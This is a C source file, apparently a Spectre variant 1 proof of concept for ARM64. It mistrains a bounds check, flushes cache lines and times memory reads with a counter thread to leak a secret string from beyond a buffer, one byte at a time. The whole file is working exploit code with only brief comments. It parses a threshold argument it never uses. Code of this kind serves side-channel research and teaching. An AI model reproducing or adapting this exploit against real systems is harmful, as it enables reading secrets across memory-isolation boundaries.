#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>

#define DELTA 1024
volatile uint64_t counter = 0;
unsigned int buffer_size = 16;
u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
u_int8_t array[256*4096];
char*secret = "This is a secret string";
u_int8_t temp = 0;

static inline void flush(void *address) {
	asm volatile ("DC CIVAC, %0" : : "r" (address)); //Cache line clear and invalidate based on virtual address
	asm volatile("DSB SY"); // Barrier, forces the cache flush to complete before the barrier
}

void *increment_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY"); // Memory barrier, forces the increment to complete
	}
}

static u_int64_t timed_read(volatile uint8_t *address) {
	u_int64_t ns = counter;
	asm volatile (
		"DSB SY\n" //memory barrier
		"LDR X0, [%0]\n" // load into register x0, the value in [address]
		"DSB SY\n" //memory barrier
		: : "r" (address) : "x0"); // x0 is added to clobber list since its not an explicit output value
	return counter - ns;
}

void flushSideChannel()
{
  int i;
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
}


void victim(size_t x){
	if (x < buffer_size) {
		temp &= array[buffer[x]*4096 + DELTA];
	}
}

void spectre(size_t offset){
  int i;
  u_int8_t s;
	register u_int64_t time;
	size_t training_x, x;
	static int results[256];
	for(i=0; i<256; i++){
		results[i] = 0;
	}

	int tries;
	int j;
	for (tries = 999; tries > 0; tries--) {
		flushSideChannel();

		training_x = tries % buffer_size;
		for (j = 29; j >= 0; j--) {
			flush(&buffer_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (offset ^ training_x));

			/* Call the victim! */
			victim(x);
		}
		for(i = 0; i < 256; i++){
	    time = timed_read(&array[i*4096 + DELTA]);
	    if (time <= 10){
	      results[i] += 1;
	    }
	  }
	}
	int max_value = 0;
	int max_char = 0;
	for(i=16; i<256; i++){
		if(results[i] > max_value){
			max_value = results[i];
			max_char = i;
		}
	}
	printf("Max. character = (%c, %d) \n", max_char, max_value);
}

int main(int argc, const char**argv){
  int thresh = atoi(argv[1]);

  printf("Secret %p\n",(void*)&secret);
  printf("Buffer %p\n",(void*)&buffer);
  printf("Array %p\n",(void*)&array);

  //Start the counter
  pthread_t counter_thread;
  pthread_create(&counter_thread, NULL, increment_counter, NULL);
  while (counter < 100000000); //sleep
  asm volatile ("DSB SY");

  size_t secret_offset = (size_t)(secret - (char*)buffer);
	for(int i=0; i<23; i++){
  	spectre(secret_offset+i);
	}
  return (0);
}
